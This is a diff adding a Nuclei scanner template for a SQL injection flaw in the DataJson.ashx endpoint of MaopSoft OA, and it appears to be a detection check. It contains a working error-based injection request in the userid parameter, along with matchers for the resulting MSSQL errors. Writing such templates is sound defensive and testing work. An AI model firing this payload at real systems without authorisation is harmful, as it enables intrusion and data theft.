@@ -1,0 +1,36 @@
+id: maopsoft-oa-datajson-sqli
+info:
+  name: MaopSoft OA DataJson.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in MaopSoft OA DataJson.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/Html/Document/DataJson.ashx?userid=-8575+OR+2250+IN+%28SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%29 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SqlException"
+          - "MaopOA"
+          - "0x{{t2}}"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
